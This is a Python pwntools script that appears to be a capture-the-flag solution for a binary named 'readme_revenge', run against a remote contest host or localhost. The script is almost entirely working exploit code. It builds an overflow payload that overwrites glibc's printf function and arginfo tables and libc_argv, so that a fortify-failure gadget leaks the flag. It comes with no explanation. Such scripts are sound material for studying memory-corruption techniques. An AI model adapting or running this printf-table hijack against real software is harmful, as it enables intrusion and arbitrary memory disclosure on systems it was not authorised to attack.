#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

if len(sys.argv) > 1:
    r = remote('35.198.130.245',1337)
else:
    r = remote('127.0.0.1', 4444)

code = ELF('./readme_revenge')
context.arch = code.arch
context.log_level = 'debug'

flag = 0x6B4040
name = 0x6B73E0
libc_argv = 0x6B7980
printf_func_table  = 0x6B7A28
printf_arginfo_table = 0x6B7AA8

fortify_gadget = 0x4359E0

raw_input('#')
p = flat(
    0, 
    fortify_gadget
    )
p = p.ljust(libc_argv - name, '\x00')
p += 'AAAAAAAA'
p = p.ljust(printf_func_table - name, '\x00')
p += p64(name - 0x73*8 + 8) # printf_arginfo -> fortify_gadget
p = p.ljust(printf_arginfo_table - name, '\x00')
p += p64(name - 0x73*8) #  printf_func -> null
p = p.replace('A'*8, p64(len(p)+name))
p += p64(flag)

r.sendline(p)
r.interactive()
